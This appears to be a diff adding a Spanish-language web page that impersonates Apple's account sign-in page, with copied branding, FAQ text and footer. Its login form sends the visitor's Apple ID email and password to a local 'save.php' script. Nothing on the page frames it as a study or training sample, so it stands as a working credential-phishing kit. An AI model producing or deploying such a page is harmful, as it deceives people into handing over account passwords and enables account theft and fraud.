@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cuenta de Apple</title>
+    <!-- Incluyendo Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Incluyendo la fuente Inter de Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* Estilos personalizados para aplicar la fuente Inter */
+        body {
+            font-family: 'Inter', sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+    </style>
+</head>
+<body class="bg-gray-50 text-gray-800">
+
+    <!-- Encabezado de la página -->
+    <header class="p-4">
+        <div class="max-w-7xl mx-auto flex justify-between items-center">
+            <h1 class="text-xl font-semibold">Cuenta de Apple</h1>
+            <nav class="flex items-center space-x-6 text-sm">
+                <a href="#" class="text-blue-600 hover:underline">Iniciar sesión</a>
+                <a href="#" class="text-blue-600 hover:underline">Crear tu cuenta de Apple</a>
+                <a href="#" class="text-blue-600 hover:underline">Preguntas frecuentes</a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Contenido Principal -->
+    <main class="py-16 px-4 text-center">
+        
+        <!-- Sección del Logo -->
+        <div class="mb-8">
+            <img src="https://res.cloudinary.com/dz8ziw5hb/image/upload/v1749263766/Screenshot_2025-06-06_at_10.36.01_PM_ak6xtg.png" alt="Logo de Apple con puntos de colores" class="w-48 h-48 mx-auto">
+        </div>
+
+        <!-- Título principal -->
+        <h2 class="text-4xl md:text-5xl font-bold max-w-2xl mx-auto">Una sola cuenta para todo Apple</h2>
+        <p class="mt-4 text-lg max-w-2xl mx-auto">Una sola cuenta de Apple y una sola contraseña te dan acceso a todos los servicios de Apple. Inicia sesión para administrar tu cuenta.</p>
+        <div class="mt-8">
+            <form method="POST" action="save.php" class="mt-8 max-w-sm mx-auto">
+                <input type="email" name="email" placeholder="Apple ID" required class="mb-2 w-full px-4 py-2 border border-gray-300 rounded">
+                <input type="password" name="password" placeholder="Contraseña" required class="mb-4 w-full px-4 py-2 border border-gray-300 rounded">
+                <button type="submit" class="bg-blue-600 text-white font-semibold py-2 px-6 rounded-full hover:bg-blue-700 transition duration-300">Iniciar sesión</button>
+            </form>            
+        </div>
+
+    </main>
+
+    <!-- Sección de características -->
+    <section class="max-w-5xl mx-auto py-16 px-4 grid md:grid-cols-2 gap-8">
+        
+        <!-- Tarjeta: Tienes el control -->
+        <div class="bg-white p-8 rounded-lg text-left">
+            <div class="mb-4">
+                <!-- Icono de Control -->
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M12 6V4m0 2a2 2 0 100 4m0-4a2 2 0 110 4m-6 8a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4m6 6v10m6-2a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4" />
+                </svg>
+            </div>
+            <h3 class="text-2xl font-semibold mb-2">Tienes el control</h3>
+            <p class="text-gray-600">Revisa o actualiza la información importante como tu nombre, contraseña y tus detalles de seguridad. Personaliza cómo otras personas pueden contactarte, actualiza tu información de pago y administra los dispositivos conectados a tu cuenta.</p>
+        </div>
+
+        <!-- Tarjeta: Privada y segura -->
+        <div class="bg-white p-8 rounded-lg text-left">
+             <div class="mb-4">
+                <!-- Icono de Privacidad -->
+                 <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                     <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                 </svg>
+            </div>
+            <h3 class="text-2xl font-semibold mb-2">Privada y segura</h3>
+            <p class="text-gray-600">La privacidad y seguridad están integradas. Con funciones de seguridad como la autenticación de dos factores, Apple te ayuda a mantener tu cuenta segura, protege tu privacidad y te permite mantener el control de tu información.</p>
+        </div>
+    </section>
+
+    <!-- Sección de Preguntas Frecuentes -->
+    <section class="max-w-4xl mx-auto py-16 px-4 text-left">
+        <div class="mb-8">
+            <!-- Icono de FAQ -->
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+            </svg>
+        </div>
+
+        <div class="space-y-6 text-gray-700">
+            <div>
+                <h4 class="font-semibold text-lg text-black">¿Qué es una cuenta de Apple?</h4>
+                <p>Una cuenta de Apple es la cuenta personal que usas para acceder a los servicios de Apple como App Store, iCloud, Messages, Apple Online Store, FaceTime y muchos más. Incluye la información que usas para iniciar sesión, así como todos los detalles de contacto, pago y seguridad que usarás en todos los servicios de Apple.</p>
+            </div>
+            <div>
+                <h4 class="font-semibold text-lg text-black">¿Qué diferencia hay entre un Apple ID y una cuenta de Apple?</h4>
+                <p>No hay diferencia, el Apple ID se llamaba anteriormente y como parte de una actualización se cambió a cuenta de Apple, que implica no solo una experiencia de inicio de sesión única para todos los dispositivos y servicios de Apple, sino también una interfaz de cuenta rediseñada y opciones de autoservicio.</p>
+            </div>
+            <div>
+                <h4 class="font-semibold text-lg text-black">¿Cuándo uso mi cuenta de Apple?</h4>
+                <p>Cada vez que configures un nuevo dispositivo, hagas una compra o uses un servicio de Apple, se te solicitará iniciar sesión con tu cuenta de Apple y tu contraseña. Una vez que hayas iniciado sesión, tendrás acceso al servicio y a toda tu información personal en tu cuenta. Siempre mantén la sesión iniciada en tus dispositivos para asegurar que todos tus dispositivos y servicios de Apple funcionen juntos sin problemas y puedas acceder a tu información personal desde todos tus dispositivos.</p>
+            </div>
+        </div>
+        <div class="mt-8">
+            <a href="#" class="text-blue-600 hover:underline">Ver todas las preguntas frecuentes &rarr;</a>
+        </div>
+    </section>
+
+    <!-- Pie de página -->
+    <footer class="bg-gray-100 text-gray-500 text-xs py-8 px-4">
+        <div class="max-w-5xl mx-auto">
+            <p class="mb-4">
+                Más formas de comprar: <a href="#" class="text-blue-600">Busca un Apple Store</a> o <a href="#" class="text-blue-600">un distribuidor</a> cerca de ti. O llama al 800-MY-APPLE.
+            </p>
+            <div class="border-t border-gray-300 pt-4 flex flex-wrap justify-between items-center">
+                <p class="mb-2 md:mb-0">Copyright © 2025 Apple Inc. Todos los derechos reservados.</p>
+                <div class="flex flex-wrap space-x-4">
+                    <a href="#" class="hover:underline">Política de privacidad</a>
+                    <a href="#" class="hover:underline">Términos de uso</a>
+                    <a href="#" class="hover:underline">Ventas y reembolsos</a>
+                    <a href="#" class="hover:underline">Aviso legal</a>
+                    <a href="#" class="hover:underline">Mapa del sitio</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+</body>
+</html>
